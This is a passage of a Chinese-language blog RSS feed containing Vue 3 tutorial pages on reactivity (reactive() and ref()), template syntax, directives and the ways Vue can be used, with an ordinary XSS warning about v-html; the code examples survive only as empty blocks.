<p>若要等待一个状态改变后的 DOM 更新完成，你可以使用 <a href="">nextTick()</a> 这个全局 API：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> 深层响应性</h3>
<p>在 Vue 中，状态都是默认深层响应式的。这意味着即使在更改深层次的对象或数组，你的改动也能被检测到。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>你也可以直接创建一个 <a href="">浅层响应式对象</a>。它们仅在顶层具有响应性，一般仅在某些特殊场景中需要。</p>
<h3> 响应式代理 VS 原始对象</h3>
<p>值得注意的是，<code>reactive()</code> 返回的是一个原始对象的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy" target="_blank" rel="noopener noreferrer">Proxy</a>，它和原始对象是不相等的：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>只有代理对象是响应式的，更改原始对象不会触发更新。因此，使用 Vue 的响应式系统的最佳实践是 <strong>仅使用你声明对象的代理版本</strong>。</p>
<p>为保证访问代理的一致性，对同一个原始对象调用 <code>reactive()</code> 会总是返回同样的代理对象，而对一个已存在的代理对象调用 <code>reactive()</code> 会返回其本身：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个规则对嵌套对象也适用。依靠深层响应性，响应式对象内的嵌套对象依然是代理：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> reactive() 的局限性</h3>
<p><code>reactive()</code> API 有两条限制：</p>
<ol>
<li>
<p>仅对对象类型有效（对象、数组和 <code>Map</code>、<code>Set</code> 这样的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects#%E4%BD%BF%E7%94%A8%E9%94%AE%E7%9A%84%E9%9B%86%E5%90%88%E5%AF%B9%E8%B1%A1" target="_blank" rel="noopener noreferrer">集合类型</a>），而对 <code>string</code>、<code>number</code> 和 <code>boolean</code> 这样的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Primitive" target="_blank" rel="noopener noreferrer">原始类型</a> 无效。</p>
</li>
<li>
<p>因为 Vue 的响应式系统是通过属性访问进行追踪的，因此必须始终保持对该响应式对象的相同引用。这意味着不可以随意地 “替换” 一个响应式对象，因为这将导致对初始引用的响应性连接丢失：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
<p>同时这也意味着当我们将响应式对象的属性赋值或解构至本地变量时，或是将该属性传入一个函数时，我们会失去响应性：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 用 ref() 定义响应式变量</h2>
<p><code>reactive()</code> 的种种限制归根结底是因为 JavaScript 没有可以作用于所有值类型的 “引用” 机制。为此，Vue 提供了一个 <a href="">ref()</a> 方法来允许我们创建可以使用任何值类型的响应式 <strong>ref</strong>：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>ref()</code> 将传入参数的值包装为一个带 <code>.value</code> 属性的 ref 对象：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>TypeScript 用户请参阅：<a href="">为 ref 标注类型</a> <sup class="vt-badge ts"></sup></p>
<p>和响应式对象的属性类似，<code>ref</code> 的 <code>.value</code> 属性也是响应式的。同时，当值为对象类型时，会用 <code>reactive()</code> 自动转换它的 <code>.value</code>。</p>
<p>一个包含对象类型值的 <code>ref</code> 可以响应式地替换整个对象：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>ref</code> 被传递给函数或是从一般对象上被解构时，不会丢失响应性：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>简言之，<code>ref()</code> 能创造一种对任意值的 “引用”，并能够在 <strong>不丢失响应性</strong> 的前提下传递这些引用。这个功能很重要，因为它经常用于将逻辑提取到 <a href="">组合函数</a> 中。</p>
<h3> ref 在模板中的解包</h3>
<p>当 ref 在模板中作为顶层属性被访问时，它们会被自动 “解包”，所以不需要使用 <code>.value</code>。下面是之前的计数器例子，用 <code>ref()</code> 代替：</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="highlight-lines"><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlight-line">&nbsp;</div><br><br></div><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://sfc.vuejs.org/#eyJBcHAudnVlIjoiPHNjcmlwdCBzZXR1cD5cbmltcG9ydCB7IHJlZiB9IGZyb20gJ3Z1ZSdcblxuY29uc3QgY291bnQgPSByZWYoMClcblxuZnVuY3Rpb24gaW5jcmVtZW50KCkge1xuICBjb3VudC52YWx1ZSsrXG59XG48L3NjcmlwdD5cblxuPHRlbXBsYXRlPlxuICA8YnV0dG9uIEBjbGljaz1cImluY3JlbWVudFwiPnt7IGNvdW50IH19PC9idXR0b24+XG48L3RlbXBsYXRlPiIsImltcG9ydC1tYXAuanNvbiI6IntcbiAgXCJpbXBvcnRzXCI6IHtcbiAgICBcInZ1ZVwiOiBcImh0dHBzOi8vc2ZjLnZ1ZWpzLm9yZy92dWUucnVudGltZS5lc20tYnJvd3Nlci5qc1wiXG4gIH1cbn0ifQ==" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>仅当 ref 是模板渲染上下文的 <strong>顶层属性</strong> 时才适用自动 “解包”。例如：<code>object</code> 是顶层属性，但 <code>object.foo</code> 不是</p>
</div>
<p>所以我们给出以下 object：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>下面的表达式将 <strong>不会</strong> 像预期的那样工作：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>渲染的结果会是一个 <code>[object Object]1</code>，因为 <code>object.foo</code> 是一个 ref 对象。可以通过将 <code>foo</code> 改成顶层属性来解决这个问题：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>现在渲染结果将是 <code>2</code>。</p>
<p>需要注意的是，如果一个 ref 是文本插值（即一个 <code>{{ }}</code> 符号）计算的最终值，它也将被解包。因此下面的渲染结果将为 <code>1</code>：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这只是文本插值的一个方便功能，相当于 <code>{{ object.foo.value }}</code>。</p>
<h3> ref 在响应式对象中的解包</h3>
<p>当一个 <code>ref</code> 被嵌套在一个响应式对象中，作为属性被访问或更改时，它会自动解包，因此会表现得和一般的属性一样：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果将一个新的 ref 赋值给一个关联了已有 ref 的属性，那么它会替换掉旧的 ref：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>只有当嵌套在一个深层响应式对象内时，才会发生 ref 解包。当其作为 <a href="">浅层响应式对象</a> 的属性被访问时不会解包。</p>
<h4> 数组和集合类型的 ref 解包</h4>
<p>跟响应式对象不同，当 ref 作为响应式数组或像 <code>Map</code> 这种原生集合类型的元素被访问时，不会进行解包。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>模板语法</title>
      <link>https://sankgao.github.io/computers/framework/vue3/template_syntax.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/template_syntax.html</guid>
      <source url="https://sankgao.github.io/rss.xml">模板语法</source>
      <description>Vue 使用一种基于 HTML 的模板语法，能够 声明式 地将其组件实例的数据绑定到呈现的 DOM 上。所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析。 在底层机制中，Vue 会将模板编译成高度优化的 JavaScript 代码。结合响应式系统，当应用状态变更时，Vue 能够智能地推导出需要重新渲染的组...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>Vue 使用一种基于 HTML 的模板语法，能够 <strong>声明式</strong> 地将其组件实例的数据绑定到呈现的 DOM 上。所有的 Vue 模板都是语法层面合法的 HTML，可以被符合规范的浏览器和 HTML 解析器解析。</p>
<p>在底层机制中，Vue 会将模板编译成高度优化的 JavaScript 代码。结合响应式系统，当应用状态变更时，Vue 能够智能地推导出需要重新渲染的组件的最少数量，并应用最少的 DOM 操作。</p>
<p>如果您对虚拟 DOM 的概念比较熟悉，并且偏好直接使用 JavaScript，您也可以结合可选的 JSX 支持 <a href="">直接手写渲染函数</a> 而不采用模板。但请注意，这将不会享受到和模板同等级别的编译时优化。</p>
<h2> 文本插值</h2>
<p>最基本的数据绑定形式是文本插值，它使用的是 “Mustache” 语法（即双大括号）：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>双大括号标签会被替换为 <a href="">相应组件实例中</a> <code>msg</code> 属性的值。同时每次 <code>msg</code> 属性更改时它也会同步更新。</p>
<h2> 原始 HTML</h2>
<p>双大括号会将数据解释为纯文本，而不是 HTML。若想插入 HTML，您需要使用 <code>v-html</code> 指令：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p class="demo">
  </p><p>Using text interpolation: {{ rawHtml }}</p>
  <p>Using v-html directive: <span v-html="rawHtml"></span></p>
<p></p>
<p>这里看到的 <code>v-html</code> 属性被称为一个 <strong>指令</strong>。指令由 <code>v-</code> 作为前缀，表明它们是一些由 Vue 提供的特殊属性，它们将为渲染的 DOM 应用特殊的响应式行为。这里做的事情简单来说就是：在当前组件实例上，将此元素的 innerHTML 与 <code>rawHtml</code> 属性保持同步。</p>
<p><code>span</code> 的内容将会被替换为 <code>rawHtml</code> 属性的值，插值为纯 HTML——数据绑定将会被忽略。<strong>注意</strong>，您不能使用 <code>v-html</code> 来拼接组合模板，因为 Vue 不是一个基于字符串的模板引擎。在使用 Vue 时，应当使用组件作为 UI 重用和组合的基本单元。</p>
<div class="hint-container warning">
<p class="hint-container-title">安全警告</p>
<p>在网站上动态渲染任意 HTML 是非常危险的，因为这非常容易造成 <a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener noreferrer">XSS 漏洞</a>。请仅在内容安全可信时再使用 <code>v-html</code>，并且 <strong>永远不要</strong> 使用用户提供的 HTML 内容</p>
</div>
<h2> Attribute 绑定</h2>
<p>双大括号不能在 HTML 属性中使用。想要响应式地绑定一个 <code>attribute</code>，应该使用 <code>v-bind</code> 指令：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>v-bind</code> 指令指示 Vue 将元素的 <code>id</code> attribute 与组件的 <code>dynamicId</code> 属性保持一致。如果绑定的值是 <code>null</code> 或者 <code>undefined</code>，那么该 attribute 将会从渲染的元素上移除。</p>
<h3> 简写</h3>
<p>因为 <code>v-bind</code> 非常常用，特意提供了一个特定的简写语法：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>开头为 <code>:</code> 的 attribute 可能和一般的 HTML attribute 看起来不太一样，但它的确是合法的 attribute 名称字符，并且所有支持 Vue 的浏览器都能正确解析它。此外，他们不会出现在最终渲染的 DOM 中。简写语法是可选的。</p>
<h3> 布尔型 Attribute</h3>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes#%E5%B8%83%E5%B0%94%E5%80%BC%E5%B1%9E%E6%80%A7" target="_blank" rel="noopener noreferrer">布尔型 attribute</a> 依据 <code>true/false</code> 值来决定 attribute 是否应该存在于该元素上。<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/disabled" target="_blank" rel="noopener noreferrer">disabled</a> 就是最常见的例子之一。</p>
<p><code>v-bind</code> 在这种场景下的行为略有不同：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当 <code>isButtonDisabled</code> 为 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Truthy" target="_blank" rel="noopener noreferrer">真值</a> 或一个空字符串（即 <code>&lt;button disabled=""&gt;</code>）时，元素会包含这个 <code>disabled</code> attribute。而当其为其他 <a href="https://developer.mozilla.org/en-US/docs/Glossary/Falsy" target="_blank" rel="noopener noreferrer">假值</a> 时 attribute 将被忽略。</p>
<h3> 动态绑定多个值</h3>
<p>如果您有像这样的一个包含多个 attribute 的 JavaScript 对象：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>通过不带参数的 <code>v-bind</code>，您可以将它们绑定到单个元素上：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2> 使用 JavaScript 表达式</h2>
<p>至此仅在模板中绑定了一些简单的属性名。但是 Vue 实际上在所有的数据绑定中都支持完整的 JavaScript 表达式：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这些表达式都会被作为 JavaScript ，以当前组件实例为作用域解析执行。</p>
<p>在 Vue 模板内，JavaScript 表达式可以被使用在如下场景上：</p>
<ul>
<li>在文本插值中（双大括号）</li>
<li>在任何 Vue 指令（以 <code>v-</code> 开头的特殊 attribute）attribute 的值中</li>
</ul>
<h3> 仅支持表达式</h3>
<p>每个绑定仅支持 <strong>单一表达式</strong>，也就是一段能够被求值的 JavaScript 代码。一个简单的判断方法是是否可以合法地写在 <code>return</code> 后面。</p>
<p>因此，下面的例子都是 <strong>无效</strong> 的：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> 调用函数</h3>
<p>可以在绑定的表达式中使用一个组件暴露的方法：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>绑定在表达式中的方法在组件每次更新时都会被重新调用，因此 <strong>不</strong> 应该产生任何副作用。比如：改变数据或触发异步操作</p>
</div>
<h3> 受限的全局访问</h3>
<p>模板中的表达式将被沙盒化，仅能够访问到 <a href="https://github.com/vuejs/core/blob/main/packages/shared/src/globalsWhitelist.ts#L3" target="_blank" rel="noopener noreferrer">有限的全局对象列表</a>。该列表中会暴露常用的内置全局对象。比如：<code>Math</code> 和 <code>Date</code>。</p>
<p>没有显式包含在列表中的全局对象将不能在模板内表达式中访问，例如：用户附加在 <code>window</code> 上的属性。然而，您也可以自行在 <a href=""><code>app.config.globalProperties</code></a> 上显式地添加它们，供所有的 Vue 表达式使用。</p>
<h2> 指令 Directives</h2>
<p>指令是带有 <code>v-</code> 前缀的特殊 attribute。Vue 提供了许多 <a href="">内置指令</a>，包括上面所介绍的 <code>v-bind</code> 和 <code>v-html</code>。</p>
<p>指令 attribute 的期望值为一个 JavaScript 表达式（除了少数几个例外，即之后要讨论到的 <code>v-for</code>、<code>v-on</code> 和 <code>v-slot</code>）。一个指令的任务是在其表达式的值变化时响应式地更新 DOM。以 <a href=""><code>v-if</code></a> 为例：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里，<code>v-if</code> 指令会基于表达式 <code>seen</code> 的值的真假来移除/插入该 <code>&lt;p&gt;</code> 元素。</p>
<h3> 参数 Arguments</h3>
<p>某些指令会需要一个 “参数”，在指令名后通过一个冒号隔开做标识。例如：用 <code>v-bind</code> 指令来响应式地更新一个 HTML attribute：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里 <code>href</code> 就是一个参数，它告诉 <code>v-bind</code> 指令将表达式 <code>url</code> 的值绑定到元素的 <code>href</code> attribute 上。在简写中，参数前的一切（例如 <code>v-bind:</code>）都会被缩略为一个 <code>:</code> 字符。</p>
<p>另一个例子是 <code>v-on</code> 指令，它将监听 DOM 事件：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里的参数是要监听的事件名称：<code>click</code>。<code>v-on</code> 有一个相应的缩写，即 <code>@</code> 字符。</p>
<h3> 动态参数</h3>
<p>同样在指令参数上也可以使用一个 JavaScript 表达式，需要包含在一对方括号内：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里的 <code>attributeName</code> 会作为一个 JavaScript 表达式被动态执行，计算得到的值会被用作最终的参数。例如：如果您的组件实例有一个数据属性 <code>attributeName</code>，其值为 <code>"href"</code>，那么这个绑定就等价于 <code>v-bind:href</code>。</p>
<p>相似地，您还可以将一个函数绑定到动态的事件名称上：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在此示例中，当 <code>eventName</code> 的值是 <code>"focus"</code> 时，<code>v-on:[eventName]</code> 就等价于 <code>v-on:focus</code>。</p>
<h4> 动态参数值的限制</h4>
<p>动态参数中表达式的值应当是一个字符串，或者是 <code>null</code>。特殊值 <code>null</code> 意为显式移除该绑定。其他非字符串的值会触发警告。</p>
<h4> 动态参数语法的限制</h4>
<p>动态参数表达式因为某些字符的缘故有一些语法限制，比如：空格和引号，在 HTML attribute 名称中都是不合法的。例如下面的示例：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>如果您需要传入一个复杂的动态参数，推荐使用 <a href="./computed">计算属性</a> 替换复杂的表达式，也是 Vue 最基础的概念之一。</p>
<p>当使用 DOM 内嵌模板（直接写在 HTML 文件里的模板）时，需要避免在名称中使用大写字母，因为浏览器会强制将其转换为小写：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上面的例子将会在 DOM 内嵌模板中被转换为 <code>:[someattr]</code>。如果您的组件拥有 <code>someAttr</code> 属性而非 <code>someattr</code>，这段代码将不会工作。单文件组件内的模板 <strong>不</strong> 受此限制。</p>
<h3> 修饰符 Modifiers</h3>
<p>修饰符是以点开头的特殊后缀，表明指令需要以一些特殊的方式被绑定。例如：<code>.prevent</code> 修饰符会告知 <code>v-on</code> 指令对触发的事件调用 <code>event.preventDefault()</code>：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>最后，在这里您可以直观地看到完整的指令语法：</p>
<figure><figcaption>指令语法图</figcaption></figure>
]]></content:encoded>
    </item>
    <item>
      <title>使用 Vue 的多种方式</title>
      <link>https://sankgao.github.io/computers/framework/vue3/ways_of_using_vue.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/ways_of_using_vue.html</guid>
      <source url="https://sankgao.github.io/rss.xml">使用 Vue 的多种方式</source>
      <description>我们相信在 Web 的世界里没有一种方案可以解决所有问题。正因如此，Vue 被设计成一个灵活的、可以渐进式集成的框架。根据使用场景的不同需要，相应地有多种不同的方式来使用 Vue，以此在技术栈复杂度、开发体验和性能表现间取得最佳平衡。 独立脚本 Vue 可以以一个单独 JS 文件的形式使用，无需构建步骤！如果您的后端框架已经渲染了大部分的 HTML，或...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>我们相信在 Web 的世界里没有一种方案可以解决所有问题。正因如此，Vue 被设计成一个灵活的、可以渐进式集成的框架。根据使用场景的不同需要，相应地有多种不同的方式来使用 Vue，以此在技术栈复杂度、开发体验和性能表现间取得最佳平衡。</p>
<h2> 独立脚本</h2>
<p>Vue 可以以一个单独 JS 文件的形式使用，无需构建步骤！如果您的后端框架已经渲染了大部分的 HTML，或者您的前端逻辑并不复杂，不需要构建步骤，这是最简单的使用 Vue 的方式。在这些场景中您可以将 Vue 看作一个更加声明式的 jQuery <strong>替代品。</strong></p>
<p>Vue 也提供了另一个更适用于此类无构建步骤场景的版本 <a href="https://github.com/vuejs/petite-vue" target="_blank" rel="noopener noreferrer">petite-vue</a>。它为渐进式增强已有的 HTML 作了特别的优化，功能更加精简，十分轻量。</p>
<h2> 作为 Web Component 嵌入</h2>
<p>您可以用 Vue 来 <a href="">构建标准的 Web Component</a>，这些 <code>Web Component</code> 可以嵌入到任何 HTML 页面中，无论它们是如何被渲染的。这个方式让您能够在不需要顾虑最终使用场景的情况下使用 Vue。因为生成的 Web Component 可以 <strong>嵌入</strong> 到旧应用、静态 HTML，甚至用其他框架构建的应用中。</p>
<h2> 单页面应用（SPA）</h2>
<p>一些应用在前端需要具有丰富的 <strong>交互性</strong>、<strong>较深的会话</strong> 和 <strong>复杂的状态逻辑</strong>。构建这类应用的最佳方法是使用这样一种架构。Vue 不仅控制整个页面，还负责处理抓取新数据，并在无需重新加载的前提下处理页面切换。这种类型的应用通常称为 <strong>单页应用</strong>（Single-Page application，缩写为 <code>SPA</code>）。</p>
<p>Vue 提供了核心功能库和<a href="">全面的工具链支持</a>，为现代 SPA 提供了极佳的开发体验，覆盖以下方面：</p>
<ul>
<li>客户端路由</li>
<li>极其快速的构建工具</li>
<li>IDE 支持</li>
<li>浏览器开发工具</li>
<li>TypeScript 支持</li>
<li>测试工具</li>
</ul>
<p>SPA 一般要求后端提供 API 数据接口，但您也可以将 Vue 和如：<a href="https://inertiajs.com" target="_blank" rel="noopener noreferrer">Inertia.js</a> 之类的解决方案搭配使用，在保留侧重服务端的开发模型的同时获得 SPA 的益处。</p>
<h2> 全栈/SSR</h2>
<p>纯客户端的 SPA 在首屏加载和 SEO 方面有显著的问题，因为浏览器会收到一个巨大的 HTML 空页面，只有等到 JavaScript 加载完毕才会渲染出内容。</p>
<p>Vue 提供了一系列 API，支持将一个 Vue 应用在服务端渲染成 HTML 字符串。这能让服务器 <strong>直接返回</strong> 渲染好的 HTML，让用户在 JavaScript 下载完毕前就看到页面内容。Vue 之后会在客户端对应用进行 <strong>激活（hydrate）</strong> 使其重获可交互性。这被称为 <a href="">服务端渲染（SSR）</a>，它能够极大地改善应用在 Web 核心指标上的性能表现，如：<a href="https://web.dev/lcp/" target="_blank" rel="noopener noreferrer">最大内容绘制 (LCP)</a>。</p>
<p>Vue 生态中有一些针对此类场景的、基于 Vue 的上层框架，比如：<a href="https://nuxt.com/" target="_blank" rel="noopener noreferrer">NuxtJS</a>，能让您用 Vue 和 JavaScript 开发一个全栈应用。</p>
<h2> JAMStack/SSG</h2>
<p>如果所需的数据是静态的，那么服务端渲染可以提前完成。这意味着我们可以将整个应用预渲染为 HTML，并将其作为静态文件部署。这增强了站点的性能表现，也使部署变得更容易，因为我们无需根据请求动态地渲染页面。Vue 仍可通过激活在客户端提供交互。这一技术通常被称为静态站点生成（SSG），也被称为 <a href="https://jamstack.org/what-is-jamstack/" target="_blank" rel="noopener noreferrer">JAMStack</a>。</p>
<p>SSG 有两种风格：<strong>单页</strong> 和 <strong>多页</strong>。这两种风格都能将站点 <strong>预渲染</strong> 为静态 HTML，区别在于：</p>
<ul>
<li><strong>单页 SSG</strong>：在初始页面加载后将其 “激活” 为 SPA。这需要更多的前期 JS 加载和激活成本，但后续的导航将更快，因为它只需要部分地更新页面内容，而无需重新加载整个页面</li>
<li><strong>多页 SSG</strong>：每次导航都会加载一个新页面。好处是它可以仅需最少的 JS——或者如果页面无需交互则根本不需要 JS！一些多页面 SSG 框架，如：<a href="https://astro.build/" target="_blank" rel="noopener noreferrer">Astro</a> 也支持 “部分激活”——它允许您通过 Vue 组件在静态 HTML 中创建交互式的 “孤岛”。</li>
</ul>
<p>单页 SSG 更适合于 <strong>重交互</strong>、<strong>深会话</strong> 的场景，或需要在导航之间持久化元素或状态。否则，多页 SSG 将是更好的选择。</p>
<p>Vue 团队也维护了一个名为 <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitePress</a> 的静态站点生成器，VitePress 支持两种形式的 SSG。另外，<a href="https://nuxt.com/" target="_blank" rel="noopener noreferrer">NuxtJS</a> 也支持 SSG。您甚至可以在同一个 Nuxt 应用中通过不同的路由提供 SSR 和 SSG。</p>
<h2> Web 之外...</h2>
<p>尽管 Vue 主要是为构建 Web 应用而设计的，但它绝不仅仅局限于浏览器。您还可以：</p>
<ul>
<li>配合 <a href="https://www.electronjs.org/" target="_blank" rel="noopener noreferrer">Electron</a> 或 <a href="https://tauri.studio/en/" target="_blank" rel="noopener noreferrer">Tauri</a> 构建桌面应用</li>
<li>配合 <a href="https://ionicframework.com/docs/vue/overview" target="_blank" rel="noopener noreferrer">Ionic Vue</a> 构建移动端应用</li>
<li>使用 <a href="https://quasar.dev/" target="_blank" rel="noopener noreferrer">Quasar</a> 用同一套代码同时开发桌面端和移动端应用</li>
<li>使用 Vue 的 <a href="">自定义渲染 API</a> 来构建不同目标的渲染器，比如：<a href="https://troisjs.github.io/" target="_blank" rel="noopener noreferrer">WebGL</a> 甚至是 <a href="https://github.com/vue-terminal/vue-termui" target="_blank" rel="noopener noreferrer">终端命令行</a></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>参考手册</title>
      <link>https://sankgao.github.io/languages/css3/references/</link>
      <guid>https://sankgao.github.io/languages/css3/references/</guid>
      <source url="https://sankgao.github.io/rss.xml">参考手册</source>
      <description>记录一些 CSS3 参考手册相关的信息。</description>
      <category>Languages</category>
      <pubDate>Tue, 08 Aug 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<p>记录一些 CSS3 参考手册相关的信息。</p>
<!-- more -->
<h2> 参考手册</h2>
<ul>
<li><a href="/languages/css3/references/attributes.html" target="blank">属性</a></li>
<li><a href="/languages/css3/references/selectors.html" target="blank">选择器</a></li>
<li><a href="/languages/css3/references/pseudo_classes.html" target="blank">伪类</a></li>
<li><a href="/languages/css3/references/pseudo_elements.html" target="blank">伪元素</a></li>
<li><a href="/languages/css3/references/functions.html" target="blank">函数</a></li>
